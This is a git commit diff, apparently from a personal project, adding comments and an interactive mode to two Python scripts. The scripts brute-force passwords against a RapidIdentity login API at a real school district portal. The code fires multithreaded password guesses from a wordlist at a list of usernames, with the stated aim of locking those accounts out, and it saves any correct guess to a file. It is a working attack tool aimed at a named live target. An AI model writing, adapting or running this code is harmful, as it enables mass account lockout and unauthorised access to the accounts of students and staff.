0459673ea0284a8ba0bc2ac072dc8e28e338793b
Ben Rogozinski <brogodev@gmail.com>
2022-11-15 17:48:22 +0000

    lol

--- rid_api.py
+++ rid_api.py
@@ -1,21 +1,31 @@
+#RapidIdentity API funcitons
+
 import requests
 
 def test_creds(s, url, username, password):
+    #Get id from server
     id = s.get(url).json()['id']
+    #Post username and password to server
     resp = s.post(url, json={
         'id'       : id,
         'type'     : 'username+password',
         'username' : username,
         'password' : password
     }).json()
+    #Check if password is valid
     valid = resp['type'] == 'complete'
     return valid
 
+#For batch password testing
 def test_list(s, url, username, password_list):
     for password in password_list:
+        #Strip out newline characters
         parsed_password = password.strip("\n")
+        #Check if password valid
         valid_pass = test_creds(s, url, username, parsed_password)
         if valid_pass:
+            #Log to file if, by some miracle, it actually guesses it right
             with open('password', 'w') as f:
                 f.write(parsed_password)
+        #Print info to output
         print(username, ":","Testing", parsed_password[0:30].ljust(30), valid_pass)
--- rid_locker.py
+++ rid_locker.py
@@ -5,30 +5,51 @@ import rid_api
 from threading import Thread
 from itertools import islice
 import time
+import sys
 
-name_file = open("/mnt/data/rid-locker/account_list")
-name_list = name_file.read().splitlines()
+if '--interactive-mode' in sys.argv:
+    interactive_mode = True
+    print("Interactive mode enabled")
+else:
+    interactive_mode = False
 
-thread_count = 100
-words_per_thread = 100
+#Interactive mode - get variables
+if interactive_mode:
+    name_file = open(input("Name list file: "))
+    thread_count = int(input("Thread count: "))
+    words_per_thread = int(input("Words per thread: "))
+    name_list = name_file.read().splitlines()
 
+    print("Accounts to be locked:")
+
+    for username in name_list:
+        print(username)
+
+    print("Locking in 10 seconds, press Ctrl+C to cancel")
+    time.sleep(10)
+    print("Initializing threads...")
+    time.sleep(2)
+
+#Automatic mode - use build-in variables
+else:
+    name_file = open("/mnt/data/rid-locker/account_list")
+    name_list = name_file.read().splitlines()
+    thread_count = 100
+    words_per_thread = 100
+
+name_list_parsed = content = [x for x in name_list if not x.startswith('#')]
+
+#Set static variables
 api_url = "https://portal.id.cps.edu/api/rest/authn"
 wordlist = '/mnt/data/rid-locker/all_in_one_w'
 
-#print("Accounts to be locked:")
-
-#for username in name_list:
-#    print(username)
-
-#print("Locking in 10 seconds, press Ctrl+C to cancel")
-#time.sleep(10)
-#print("Initializing threads...")
-#time.sleep(2)
-
-for username in name_list:
+#Iterate through usernames in list
+for username in name_list_parsed:
     with open(wordlist) as f:
         for i in range(0,thread_count):
+            #Split list of words into slices for multi-threaded processing
             next_n_lines = list(islice(f, words_per_thread))
+            #Stop if no more words to avoid exception
             if not next_n_lines:
                 break
             Thread(target=rid_api.test_list, args=(requests.session(), api_url, username, next_n_lines)).start()
